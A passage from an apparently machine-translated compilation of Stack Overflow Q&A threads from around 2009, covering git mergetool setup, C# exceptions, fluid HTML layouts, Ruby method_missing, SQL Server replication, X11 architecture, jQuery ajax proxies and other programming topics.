C:\myGitRepo>git config --global mergetool.prompt false 
```

存储在`winmerge.sh`您的目录部分中`PATH`：

```
#!/bin/sh
echo Launching WinMergeU.exe: $1 $2
"C:/Program Files/WinMerge/WinMergeU.exe" -e -ub "$1" "$2" 
```

> 如果您有其他工具（`kdiff3`, `P4Diff`, ...），请创建另一个 shell 脚本和相应的`mergetool.myMergeTool.cmd`配置指令。
> 然后您可以轻松地使用`merge.tool`配置切换工具。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2009-05-10T16:43:11.567

```
[mergetool "winmerge"]
    cmd = winmergeu -e -ub -wl -dl "Remote" -dr "Local" "$PWD/$REMOTE" "$PWD/$LOCAL" "$PWD/$MERGED"
    keepBackup = false 
```

如果你看里面`C:\Program Files\Git\share\git-gui\lib\mergetool.tcl`它有常用合并工具的语法。

我仍在试图弄清楚如何直接从 Git GUI 调用 mergetool ...

# c# - 显式处理或创建绑定到控件的数据对象

> ID：636263
> 
> 赞同：1
> 
> 时间：2009-03-11T20:41:01.850
> 
> 标签：c#, asp.net, ado.net

我在某处读到，数据绑定模型的少数弱点之一是您从不显式处理或创建绑定到控件的数据对象，因此您没有机会添加额外的项目。但我不确定那是什么意思。

如果允许显式创建数据对象，您将能够添加什么或如何添加额外的项目？您基本上可以将控件绑定到数据源并让运行时自动将数据源的数据填充到控件中，并且该控件还可以通过手动创建来从数据源中获取额外的项目？！它怎么可能做到这一点？！

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-03-12T00:11:19.753

在我看来，您所阅读的内容纯属废话。在绑定之前，我可以更改相关对象。例如，一种常见的情况是向 DataTable 对象（实际上是行和列的集合）中的行添加列。事实上，我可以通过向每一行添加一列（比如说总和）来进行更改。

在对类有一些限制的情况下，我可以对其他类型的集合和对象做同样的事情。

绑定对象后，我仍然可以使用数据绑定方法将项目添加到输出中，因此我仍然不受限制。

总的来说，我发现那些阐述这种垃圾的人是在使用 ASP.NET 页面中的 ASP 样式代码进行辩护。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-03-13T18:46:19.007

当您使用 OnItemDataBound 事件时，您可以通过 e.Item.DataItem 完全访问底层数据源对象。您可以使用此数据通过 e.Item.FindControl("controlname") 填充 ItemTemplate 中的任何控件。您还可以使用 <%# %> 标记内的函数来格式化文本或计算值。

# c# - 在代码的生命周期内处理异常的最佳方法是什么？

> ID：636266
> 
> 赞同：1
> 
> 时间：2009-03-11T20:42:07.137
> 
> 标签：c#, exception

当我在实用程序模块中编写要再次使用的函数时，我倾向于在函数顶部留下大量注释，并进行一些简单的输入检查，以便在函数使用不当时在调试器中抛出一条消息，w/ o 只需使用 throw 命令。

处理这种情况的最佳方法是什么？在 C# 中什么功能最容易使用？

在十年前的 CS 课程中，我们会简单地在 C++ 中使用 assert(...) 命令，如果使用不正确，就让程序崩溃。

现在我正在使用 C#，我使用了两种方法，抛出 MessageBox.Show("...") 来阐明为什么函数过早返回或使用 Console.WriteLine("...") 来获得它仅在调试控制台中解释。

我目前倾向于编写一个自定义 ErrorMessage 函数，该函数将在显示任何内容之前检查构建类型和可能的 #define 主切换，如果我处于 beta 环境中，可能会保存到 .log 文件中。

在此类实用程序模块中使用的最佳方法是什么？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-03-11T20:47:20.477

如果使用无效参数调用该方法，则它应该抛出 ArgumentException 或从它派生的异常。如果正在调用的方法由于对象的状态而当前无法调用，那么它应该抛出 InvalidOperationException。

其他人打电话给你的图书馆不会感谢你以非标准或不明显的方式做事。比如显示消息框。特别是如果他们从网站或无法显示 UI 的 Windows 服务调用您的库。并且输出到调试窗口很可能会被错过。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-03-11T20:45:14.787

抛出异常。这是指示出现问题的最清楚的方式，并且比控制台消息甚至消息框更难忽略。

特别是，假设一切正常，这意味着该代码路径*不会继续运行。*即使用户（无论是否处于测试阶段）注意到消息框，他们也不会高兴地发现，一旦他们单击“确定”，应用程序就会继续并擦除他们的数据，只是因为该实用程序方法没有正确使用。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-03-11T20:48:07.370

我同意 Jon 的回答，但您也将[Debug.Assert](http://msdn.microsoft.com/en-us/library/system.diagnostics.debug.assert.aspx)作为工具包的一部分。有时，如果您想警告开发人员某些事情，但希望它在生产代码中滑过，这可以为您提供更好的服务。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-03-11T21:48:07.180

我喜欢 pipTheGeek 的回答，但我想我会插入一个 MSR 技术的插件，该技术可能正在 C# 4.0 的管道中：[代码合同](http://research.microsoft.com/en-us/projects/contracts/)

显而易见的答案是使用打包在 .Net 基类库中的标准异常（ArgumentNullException、InvalidOperationException、NotImplementedException 等），或者如果您认为您的类的使用者可能需要了解一点，则可以发明自己的特定异常有关他们收到异常的原因的更多详细信息。

*如果您的代码将在以后使用，请务必在 Xml 注释部分列出可能的异常。*

堆栈信息由 CLR 代表您填写，因此您需要做的就是扔掉那个坏男孩，让消费者处理后果。

既然您询问了语法：

```
 /// <summary>
    /// Summary: 
    ///     Does stuff.
    /// Exceptions:
    ///     ArgumentNullException:
    ///        args must be non-null
    /// </summary>
    /// <param name="args"></param>
    public static void DoStuff(string[] args)
    {
        if(args == null)
        throw new ArgumentNullException("args", "'args' parameter cannot be null.");

        ...
    } 
```

# html - How do you make a webpage change its width automatically?

> ID：636270
> 
> 赞同：2
> 
> 时间：2009-03-11T20:43:19.863
> 
> 标签：html, expand, liquid-layout

In HTML, is there a way to make a webpage expand to the user's monitor? Like say I have a 15inch, but someone else has a 24 inch. The webpage would be small on their screen, but would fit on min. How would I make the page expand to 100%, or maybe 95%?

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-03-11T20:53:42.333

流体宽度是通过使用百分比单位或 em 单位来实现的。这一切都是关于基于网格和容器制作网站布局。 [阅读更多](http://www.maxdesign.com.au/presentation/liquid/)。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-03-11T21:23:16.070

Gumbo，“页面”是指网页内容还是包含该页面的窗口？如果你指的是窗户，答案是不要。如果您指的是内容，则可以使用流式布局；[谷歌](http://tinyurl.com/dx7fjs)那个。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-03-11T20:48:40.660

除非您自己明确设置大小，否则页面将默认使用浏览器窗口的整个宽度。

您可能会发现 Firefox 的 Web Developer 插件很有用，因为它可以让您快速将浏览器的窗口更改为特定的大小，以便您查看布局在不同大小下的外观。[https://addons.mozilla.org/en-US/firefox/addon/60](https://addons.mozilla.org/en-US/firefox/addon/60)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-03-11T20:53:19.277

除非您为网页的任何元素（例如 body 或某些包含 div）指定特定宽度，否则它将扩展到浏览器窗口的宽度。

如果您希望将像素大小设置为用户的宽度，您可以使用 javascript 动态设置宽度：

```
<script type="text/javascript">
var userWidth = screen.width;
var userHeight = screen.height;
</script> 
```

但是，您可能应该使用更流畅的布局，该布局将通过使用以百分比指定的宽度自动扩展（例如，使用 CSS 设置元素的宽度`width: 100%`：）

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-03-11T20:49:38.973

在您的 html 中：

```
<div id="content">
<!-- Some content in here -->
<div> 
```

然后在你的CSS中：

```
#content {
    width:100%;
} 
```

或更多控制：

```
#content {
    min-width:500px;
    max-width:1000px;
} 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-03-11T21:07:26.670

HTML 只是一种描述（文本）内容含义的[标记语言。](http://en.wikipedia.org/wiki/Markup_language)例如，`<h1>Foobar</h1>`just mean`Foobar`是一级标题，但没有说明它应该显示的样式。

为了设计 HTML 文档的样式，引入了[层叠样式表 (CSS)](http://en.wikipedia.org/wiki/Cascading_Style_Sheets)。[但是 CSS 也只是一种描述性语言，对用户代理](http://en.wikipedia.org/wiki/User_agent)一无所知。（您可以只描述特定元素应该以特定宽度显示，等等。）

但是 JavaScript 确实知道用户代理。您可以使用该`screen`对象来获取屏幕或可用[视口](http://www.w3.org/TR/CSS2/visuren.html#q2)`width`的和。`height`

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-03-11T21:09:59.847

我认为对于 Bob 是在询问显示器的实际大小还是窗口的大小存在一些混淆。

Josh Stodola 和 Rich Bradshaw 提供了 HTML/CSS 答案，它使用百分比来创建随窗口扩展的流畅布局。下面的代码总结了这种技术，创建了两列，一列占当前浏览器窗口的 80%，另一列占 20%。当用户更改窗口大小时，列大小会发生变化。

```
<html>
<head>
<style type="text/css">
    #content1 {
        background: #CC0000;
        height: 300px;
        width: 80%;
        float: left;
    }
    #content2 {
        background: #00CC00;
        height: 300px;
        width: 20%;
        float: left;
    }
</style>
</head>
<body>
<body>

<div id="content1"></div>

<div id="content2"></div>

</html> 
```

Rudd Zwolinski 提供了寻找用户当前分辨率的答案。其他人已经发布了使用这种方法引起的潜在烦恼，但我不知道，也许你正在对分辨率大小进行一些艺术陈述。以下是使用此方法的相同代码：

```
<html>
<head>
<style type="text/css">
    #content1 {
        background: #CC0000;
        height: 300px;
        float: left;
    }
    #content2 {
        background: #00CC00;
        height: 300px;
        float: left;
    }
</style>
<script type="text/javascript">
    var userWidth = screen.width;
    var userHeight = screen.height;

    function resizeContent()
    {
        document.getElementById("content1").style.width = parseInt(userWidth * 0.8);
        document.getElementById("content2").style.width = parseInt(userWidth * 0.2);
    }
</script>
</head>
<body onload="resizeContent()">

<div id="content1"></div>

<div id="content2"></div>

</html> 
```

希望有帮助。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2021-01-19T02:27:37.643

在一个被标记为重复的单独线程中，它询问如何自动调整您已经响应的网站大小以适应移动屏幕。它没有得到答案，从我在这里看到的来看，这个帖子也没有回答这个问题。

由于我最近遇到了同样的问题，所以我将分享我的发现。

对于那些使用 HTML5 对其网页进行编码的人，为了使您的网页“适合移动设备”，您必须添加以下代码：`<meta name=viewport content="width=device-width, initial-scale=1">`. 有些人告诉其他人将其写为`<meta name=viewport content="width=device-width, initial-scale=1, user-scalable=yes">`，但这`user-scalable=yes`不是必需的或不需要的。我访问过的每个著名的操作指南网站，包括 W3Schools.org 网站，这些信息总是被遗漏。你不需要它。

如果我将上面的代码从我的页面中删除，当我将它们加载到我的手机上时，它们会自动调整大小以适应屏幕的宽度。然而，他们随后未能通过移动友好测试。如果我在我的页面上插入上面的代码，当我在我的手机上加载它们时，我必须手动缩小我的页面。这对我来说是不可接受的。它应该显示整个页面并让用户向上缩放，而不是相反。

我发现同时满足两者的解决方案是： `<meta name=viewport content="width=device-width, initial-scale=0">` 我的网站不仅验证为“移动友好”，而且还自动调整大小以适应移动设备的屏幕宽度。

对于那些一直在寻找这个解决方案的人（至少从我看到这个问题的某些日期开始的最近 4 年），但还没有发现它，不客气！

# configuration-management - AppDomain 和配置部分键入

> ID：636275
> 
> 赞同：1
> 
> 时间：2009-03-11T20:44:15.757
> 
> 标签：configuration-management

我在 .Net 2.0 中有一个 Windows 应用程序，它使用多个级别的配置文件。由于我无法控制的原因，该应用程序包含一个 Windows 应用程序 (.exe) 项目和几个 DLL，每个 DLL 都有自己的 app.config 文件。

我已经成功地弄清楚了如何使用（在 C# 中）读取每个 DLL 的配置文件

```
ConfigurationManager.OpenMappedExeConfiguration("my DLL's config file path", ConfigurationUserLevel.None); 
```

这工作得很好 - 当指向我的 DLL 配置文件的文件路径名（“foo.dll.config”）时，我可以确认我从这个方法中获得了一个配置对象。但是，当我尝试访问自定义配置部分时，我收到一个异常，指出无法找到我的自定义配置部分的数据类型。

以这种方式加载配置文件时，我还需要做什么才能获得可用于我的代码的键入信息？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-03-11T20:49:07.773

不幸的是，这是事实：处理此问题的方法是将配置从 .dll.config 文件复制到应用程序的配置文件中。唯一的例外与 Windows 窗体中使用的设置系统有关。我认为这对你来说是 OpenMappedConfiguration，但我不确定。

我从来不知道为什么他们没有在 .NET 2.0 中统一这一点并解决问题。也许我应该问。

* * *

[当天早些时候，我在 MSDN 的奥斯陆论坛 ( http://social.msdn.microsoft.com/Forums/en-US/oslo/thread/c93ee7f3-4f9b-4044](http://social.msdn.microsoft.com/Forums/en-US/oslo/thread/c93ee7f3-4f9b-4044-b1f0-43ad72fb508d) ) 上问了一个与 WCF 相关的问题。[-b1f0-43ad72fb508d](http://social.msdn.microsoft.com/Forums/en-US/oslo/thread/c93ee7f3-4f9b-4044-b1f0-43ad72fb508d)）。当我在寻找博客文章或其他答案时（正如我上面所说，“也许我应该问”），我的论坛帖子的答案到了。

长话短说，有点半开玩笑，答案是：他们没有在 .NET 2.0 中解决这个问题，因为他们正在等待奥斯陆解决这个问题。

在不试图通过理解这一点来避免反对票的情况下，我只想提一下：奥斯陆将鼓励将应用程序模型和应用程序组件存储在中央存储库中。这将包括每个实例配置的模型。理论上，*所有*此类数据都将存储在单个存储库中（至少每个系统）。因此，不再需要配置文件位于何处的问题，它都在一个地方。不再需要查找包含配置部分元数据的程序集 - 元数据与配置数据一起存储在存储库中。

Ask me tomorrow, and I may feel differently, but right now, I may be picking up the Oslo religion...

# ruby - 默认 Ruby 访问器方法？

> ID：636277
> 
> 赞同：4
> 
> 时间：2009-03-11T20:44:22.450
> 
> 标签：ruby, method-missing

是否有一个默认方法或类访问器可以添加到 Ruby 类中，如果访问器（类似 Ruby 的属性）不退出，则该类会被调用？然后我可以编写一些自定义代码来回复，就像从数据库中读取的数组列表一样，可以像访问器一样访问值，而无需我编写访问器代码（因为如果从数据库中读取它是未知的）。

使用 Ruby MRI 1.9

谢谢！

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2009-03-11T20:46:57.280

是的，它叫`method_missing`; 每当使用未定义的方法时都会调用它。您可以使用它来添加或模拟您想要的任何方法，包括访问器。

例如，如果你把它扔在 a 上，`Hash`你可以把散列的内容当作属性：

```
h = {}
def h.method_missing(*args)
    if args.length == 1
        self[args[0]]
      elsif args.length == 2 and args[0].to_s =~ /^(.*)=$/
        self[$1.intern] = args[1]
      else
        super
      end
    end 
```

让你写：

```
h.bob = "Robert" 
```

和

```
if h.bill == "William" ... 
```

等等除了更正常的`h[:bob] = ...`风格。

# sharepoint - Using custom SharePoint rendering templates

> ID：636278
> 
> 赞同：1
> 
> 时间：2009-03-11T20:44:57.753
> 
> 标签：sharepoint, forms, moss

In MOSS 2007 (SharePoint), is there any way to access the current SPField from inside a ListFieldIterator rendering template?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2010-03-11T17:13:43.063

列表字段迭代器不是渲染模板 - 它是一个类。

如果您创建自定义字段迭代器（继承 ListFieldIterator）并将其添加到自定义呈现模板，您应该能够在项目上的任何字段中获取。我已经使用这种方法来显示/隐藏 ListItems 的字段，其中 IsFieldExcluded 方法被覆盖

# sql-server-2005 - Active - Active DR Strategy for SQL Sever 2005

> ID：636279
> 
> 赞同：4
> 
> 时间：2009-03-11T20:45:05.927
> 
> 标签：sql-server-2005, sql-server-2008

We are trying to come up with an Active - Active DR strategy for our 6 TB data warehouse. Our datawarehouse has 40 DBs and everything has to be replicated on a real time bases.

Site 1 : Needs to handle all the ETL Site 2 : Will handle all the reporting queries.

*   Database Mirroring (Cannot afford to drop and create snapshots as we cannot Kill any connections)
*   Replication
*   Log shipping

Migrating to SQL Server 2008 is an option.

Which is the best way for performance and availability?

Regards, Nagy

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-03-11T21:07:26.140

由于您不能放弃活动连接，因此日志传送也不是一种选择。您需要获得对数据库的独占访问权限才能恢复日志。硬件支持 (SAN) 将在这里提供很大帮助。我几乎希望看到您在一个服务器中进行 ETL，然后快速将该服务器设置为用于报告的活动服务器，并将另一台服务器用于 ETL。因此，您有一个没有 ETL 进程的报告服务器和一个没有报告的 ETL 服务器，但是您每晚交换哪个？基础。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-03-13T10:05:05.953

[对等事务复制](http://technet.microsoft.com/en-us/library/ms151196.aspx)可能是您的最佳选择，除非您想走昂贵的 SAN 硬件复制路径。

它的报价几乎是实时的，因此对于报告来说应该足够了。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-03-11T20:58:32.900

您需要与您的硬件供应商交谈——尤其是存储供应商，看看他们是否提供某种基于硬件的复制。从数据量来看，我认为基于软件的解决方案不会是最佳的。

这是我现在处理 3 个数据库（11、17 和 23 TB）的方法。

1.  我们在 EMC SAN 中托管数据库。
2.  每 12 小时将数据库克隆到位于同一 SAN 上的不同 lun 上，然后安装在不同的服务器上。这是在主服务器被淹没的情况下的备份。这些数据库通常比主数据库晚 12 小时。我们使用它们来报告我们可以使用 12 小时前的数据。
3.  每 24 小时，将 2 中的克隆复制到不同建筑物中的不同 SAN 并安装。这是辅助备份。在这些数据库中，我们运行诊断、DBCC 检查等。
4.  我们总共运行了 9 个 SQL Server Enterprise Edition（3 个产品、3 个第一行 DR 和 3 个第二行 DR）实例。
5.  我们决定采用这种方式，因为我们可以忍受长达 24 小时的数据滞后。

这当然是可行的，但需要您进行大量计划和投资。对我们来说，与两个 SAN 的价格以及它们之间的互连相比，9 个 EE 许可证的成本并不高。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-03-31T04:34:56.437

几乎 SQL Server 复制或使用 SQL Service Broker 的某种客户解决方案将是您的最佳选择。如果您的表是静态的并且所有数据更改都在一个站点上完成，那么事务复制可能是您最好的选择。您需要大型 WAN 管道来处理复制，因为即使使用多个线程也可以保持事务一致性。

SQL Server 2008 对 Replication 的性能进行了一些改进，因为它允许分配器使用多个线程，这可能会对您有所帮助。

# javascript - 你如何在 JavaScript 中从 JSON 中编写一个空键？

> ID：636293
> 
> 赞同：6
> 
> 时间：2009-03-11T20:47:13.707
> 
> 标签：javascript, json, key

假设您有以下 JSON 对象

```
{"":"some text"} 
```

你如何在 JavaScript 中检索它？

```
json_in_var={"":"some text"}  
alert(json_in_var.) 
```

我对此感到困惑，欢迎任何帮助！

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2009-03-11T20:49:17.150

引用它是一个语法错误

```
json_in_var. 
```

但是，您可以像这样访问它：

```
json_in_var[""] 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-03-11T20:50:29.847

容易地...

```
alert(json_in_var[""]); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2018-08-13T11:22:13.403

你可以使用`Object.keys()`：-

```
<script>
    var myObj, x;
    myObj = {"":"some text"};
    x = Object.keys(myObj)[0];
    x = myObj[x];
    document.getElementById("demo").innerHTML = x;
</script> 
```

* * *

## 回答 #4

> 赞同：-3
> 
> 时间：2009-03-11T20:58:58.077

我能够通过使用解决这个问题

```
alert(json_in_var.$t) 
```

这是在以 json 格式检索 Blogger 提要时。我不确定这是否是专有的。

# ruby-on-rails - Ruby on Rails 中的三重联接

> ID：636296
> 
> 赞同：5
> 
> 时间：2009-03-11T20:47:47.200
> 
> 标签：ruby-on-rails, associations

我对 Ruby on Rails 中的关联有疑问。在应用程序中有项目、用户、角色和组。该项目属于一个有用户的组，一个用户可以属于许多不同的组，但在该组中只能具有一个特定的角色。例如：

在一个组中，用户是项目所有者，但在另一个组中，他是作家。

使用 Rails 中的内置函数实现此功能的最佳方法是什么？

谢谢

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2009-03-11T20:57:30.360

这是一组非常快速的模型，可以满足您的要求：

```
class User < ActiveRecord::Base
  has_many :group_memberships
  has_many :groups, :through => :group_memberships
end

class GroupMembership < ActiveRecord::Base
  belongs_to :user
  belongs_to :role
  belongs_to :group
end

class Role < ActiveRecord::Base
  has_many :group_memberships
end

class Group < ActiveRecord::Base
  has_many :group_memberships
  has_many :users, :through > :group_memberships
end 
```

基本上有一个连接表，其中包含用户、组和角色 ID。我将把迁移作为提问者的练习

# linux - X11 / X - linux 桌面软件，我不明白这是如何组合在一起的

> ID：636316
> 
> 赞同：5
> 
> 时间：2009-03-11T20:51:57.080
> 
> 标签：linux, x11

我最近开始使用 Linux（我工作的地方是一家微软商店，所以我只用 C# 编写代码，使用 MS 产品等）。

我试图从高层次上理解 Linux 中的一些基本事物是如何结合在一起的。我一直在阅读[www.linfo.org](http://www.linfo.org)

无论如何，我从来没有完全了解 X 是什么。

通过阅读[这篇文章](http://www.linfo.org/x.html)，在我看来 X 是位于操作系统之上的层（一个 X 服务器位于操作系统之上？？）并且 X 客户端应用程序向 X 服务器发出请求。我认为 KDE、Xfce 和 Gnome 是显示管理器，那么它们是 X 服务器客户端吗？

我很困惑一切都在哪里。

任何解释将不胜感激！

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2009-03-11T20:58:49.467

这一切都非常模块化和灵活；然而，这会导致复杂性。

“X 服务器”驱动显示设备。它为客户端提供图形服务，这些服务非常简单——例如：

```
"Give me a window frame to draw in"

"Put this bitmap here"

"Draw a horizontal black line 100px wide"

"Render the text 'hello' at (100,100)"

"Tell me if any mouse clicks or key presses have been aimed at my window frame" 
```

X 提供了一个名为 Xlib 的库，它具有所有这些简单服务的标准接口。任何想要使用 X 服务器显示的程序最终都会使用这个客户端库，称为 X 客户端。Xlib 知道如何连接到任意 X 服务器——在本地机器上，或者通过 LAN 上的 TCP/IP，或者跨越世界——来调用这些服务。

窗口管理器，它只是另一个 X 客户端程序，负责桌面的“观感”——如何移动和排列窗口等。因为窗口管理器绘制了所有的窗口装饰，它可以使桌面看起来像 WindowsXP、Mac 或 NeXTSTEP。

X 的部分哲学是定义“机制而不是政策”——意思是，他们给你工具来做这件事，但不告诉你如何使用这些工具。一种这样的工具是窗口管理器，可以随意更换。

许多现代 X 应用程序都是为使用桌面环境而编写的，例如 Gnome 或 KDE。这为这些程序提供了一组一致的按钮和控件来绘制，并为一些传统上不包含在 X 中的东西提供了一致的界面，但通常被认为是桌面的一部分 - 例如如何响应拖放或如何呈现标准文件选择器对话框。

桌面环境通常提供一个对象模型或编程接口，负责处理所有简单的 X 客户端请求并让程序处理更重要的事情。删除这些低级调用会产生另一个重要的好处——平台独立性。

许多桌面环境都包含一个窗口管理器，因此窗口控件和按钮的外观和感觉是一致的，并且可以与环境提供的桌面隐喻配合使用。但是，它通常仍然可以关闭。

X 服务器（运行显示）和 X 客户端（想要使用显示）的分离有一些含义：

*   图形系统与 GUI 程序是分开的，它们完全分开，就像 web 浏览器和 web 服务器一样。

*   因此，GUI 程序可能不会显示在本地机器上——就像 Web 浏览器不必指向本地机器上的 Web 服务器一样。

*   一台机器可以只运行客户端，而 X 服务器在其他地方。

*   带有显示器的机器不必运行客户端——它可以只运行 X 服务器，所有客户端都可以在专用机器上运行。这是最初的瘦客户端：大型中央服务器上运行的大型程序 - 图形用户交互由用户面前办公桌上的专用硬件处理。

*   你需要知道你的 X 服务器的网络地址是什么，这样你才能告诉 GUI 程序在哪里显示它们的 GUI。（这通常通过设置 DISPLAY 环境变量来完成）

*   您可以同时在同一个桌面上显示来自许多不同机器的许多程序。这一切都是无缝处理的，包括剪切和粘贴。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-03-11T21:06:45.517

X11 是一种网络协议，当前版本为 7（因此为 X11R7）。它封装图形和输入信息，并将运行在本地或远程机器上的 X 客户端（应用程序或窗口管理器）连接到当前驱动本地屏幕和输入设备的 X 服务器。

Gnome、KDE、XFCE 和 LXDE 是桌面环境；它们包含与 X 服务器（metacity、kwin 等）对话的部分，但也包含应用程序必须遵循的规范和可用的库，以便应用程序“属于”DE。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-03-12T09:34:50.133

此外，值得记住的是，X 服务器只是另一个在 linux 下运行的程序。它没有什么特别之处，它只是碰巧知道如何抓住显卡并使用视频驱动程序接管显示器。您可以（理论上）非常愉快地运行 linux，而无需运行 X 服务器——当然，您将受限于命令行程序。

这就是 linux 组织自身的方式——以内核为基础，然后是一组为高级程序提供功能的程序，这些程序本身为高级程序提供功能，所有这些都构建成一个完整的软件堆栈，面向任何机器的工作是（例如，通用桌面、软件开发、Web 服务器等）。

除了内核和它的模块，没有什么是“特别的”。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-03-11T20:54:32.800

[维基百科](http://en.wikipedia.org/wiki/X_Window_System)有一些关于它的信息。

# jquery - jquery 的 Ajax 调用和链接响应时间，而远程站点的响应时间很长

> ID：636328
> 
> 赞同：0
> 
> 时间：2009-03-11T20:55:22.970
> 
> 标签：jquery

我在使用 jquery（ajax、load、get、post）进行异步调用时遇到问题。当我等待远程站点回答时，我无法浏览我的链接，直到远程网站回答或超时。

如果我单击指向外部网站（例如 google）的链接，页面会立即切换。我已经在我的本地 IIS、windows 2008 IIS7 和 VS2008 附带的 Web 服务器上尝试过这个。

要重现复制以下代码并将代理页面更改为您自己的页面并使其等待很长时间（或者您可能想尝试以下 Web 服务，因为它需要永远回答：[http://www.webservicex。净/globalweather.asmx/GetWeather?CityName=Inuvik&CountryName=Canada](http://www.webservicex.net/globalweather.asmx/GetWeather?CityName=Inuvik&CountryName=Canada)）。您需要使用代理页面，因为您无法进行远程 ajax 调用）。

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
    <head>
        <title>Test</title>
        <script src="http://code.jquery.com/jquery-latest.js" type="text/javascript"></script>
        <script type="text/javascript">
            $(document).ready(function() {
                //GetRemotePage();
                AjaxRemotePage();
                //LoadRemotePage();
                //PostRemotePage();
            });

            function LoadRemotePage() {
                $("#RemoteDetail").append("Calling delayed page<br />");
                $("#RemoteDetail").load("AjaxProxy.aspx?t/AjaxDelay.aspx?d=10");
            }

            function AjaxRemotePage() {
                $("#RemoteDetail").append("Calling delayed page<br />");
                $.ajax({
                    url: "AjaxProxy.aspx?/AjaxDelay.aspx?d=10",
                    async: true,
                    cache: false,
                    global: false,
                    success: function(html) {
                        $("#RemoteDetail").append("AjaxRemotePage<br />");
                        $("#RemoteDetail").append(html);
                    }
                });
            };

            function PostRemotePage() {
                $("#RemoteDetail").append("Calling delayed page<br />");
                $.post("AjaxProxy.aspx?/AjaxDelay.aspx?d=10", {}, function(xml) {
                    $("#RemoteDetail").append("---In Ajax Call<br />");
                });
            };

            function GetRemotePage() {
                $("#RemoteDetail").append("Calling delayed page<br />");
                $.get("AjaxProxy.aspx?/AjaxDelay.aspx?d=10", {}, function(xml) {
                    $("#RemoteDetail").append("---In Ajax Call<br />");
                });
            }
        </script>

    </head>
    <body>
        <div>
            <a href="http://www.google.com">go google</a><br />
            <a href="/AjaxTest.htm">go this page</a><br />
            <a href="/">go home page</a><br />
        </div>
        <div id="RemoteDetail">
        </div>
    </body>
</html> 
```

AjaxProxy.aspx => 是一个代理页面，用于返回远程页面的响应 AjaxDelay.aspx => 是模拟的远程服务/页面，增加了 10 秒（d=10）的延迟，以模拟非常慢的远程站点/服务

编辑：添加了 AjaxProxy 内容和 AjaxDelay 内容（两个页面都在 asp.net 2.0 中，aspx 页面中没有任何内容）

## Ajax代理

```
Protected Sub Page_Load(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Load
    If Request.QueryString.Count = 0 Then Response.Write(" ") : Exit Sub

    Dim Url As String = HttpUtility.UrlDecode(Request.QueryString().ToString)
    Dim req As HttpWebRequest = WebRequest.Create(Url)
    Dim res As HttpWebResponse = req.GetResponse
    Dim sreader As StreamReader = New StreamReader(res.GetResponseStream)
    Dim myhtml As String = sreader.ReadToEnd
    sreader.Close()
    res.Close()
    If Url.EndsWith(".xml") Then
        Response.AddHeader("Content-type", "application/xml")
    End If
    Response.Write(myhtml)
End Sub 
```

## Ajax延迟

```
Protected Sub Page_Load(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Load
    Dim Del As Integer = 2
    If String.IsNullOrEmpty(Request("d")) = False Then
        Integer.TryParse(Request("d"), Del)
        If Del = 0 Then Del = 2
    End If

    Del = Del * 1000
    Threading.Thread.Sleep(Del)
    Response.Write(String.Format("Delayed for {0} seconds", Del / 1000))
End Sub 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-03-11T21:02:59.283

好吧，如果包含代理的服务器位于也发出 ajax 请求的本地计算机上，那么代理可能正在做一些事情来停止计算机本身的处理。您是否查找过代理代码中可能导致严重阻塞的缺陷？

当你说

> 视窗 2008 IIS7

那是在远程机器上还是本地操作系统/IIS？

只是一个额外的......那个网络服务调用对我来说返回得非常快。

编辑：
我无法使用 FF3、Chrome、IE6/7 复制它我尝试使用以下代码，我输入什么作为替代 url 并不重要。

```
<script type="text/javascript">
        $(document).ready(function() {
            //GetRemotePage();
            AjaxRemotePage();
            //LoadRemotePage();
            //PostRemotePage();
        });

        function AjaxRemotePage() {
            $("#RemoteDetail").append("Calling delayed page<br />");
            $.ajax({
            url: "PageProxy.ashx?d=10&externalURI=http://www.yahoo.com",
                async: true,
                cache: false,
                global: false,
                success: function(html) {
                    $("#RemoteDetail").append("AjaxRemotePage<br />");
                    $("#RemoteDetail").append(html);
                }
            });
        };
</script> 
```

代理人：

```
using System;
using System.Web;

public class PageProxy : IHttpHandler {

    public void ProcessRequest (HttpContext context) {
            if (context.Request.QueryString["d"] != null)
                System.Threading.Thread.Sleep(10000);

            byte[] externalPage = new System.Net.WebClient().DownloadData(context.Request["externalURI"]);
            context.Response.OutputStream.Write(externalPage, 0, externalPage.Length);
            context.Response.End();
    }

    public bool IsReusable {
        get {
            return false;
        }
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-03-11T21:13:45.267

这在 Firefox 3.1 和 IE8 中对我来说很好。我将 URL 替换为需要 15 秒才能呈现的 ColdFusion 页面。我将“转到此页面”链接更改为：

```
<a href="test2.html">go this page</a><br /> 
```

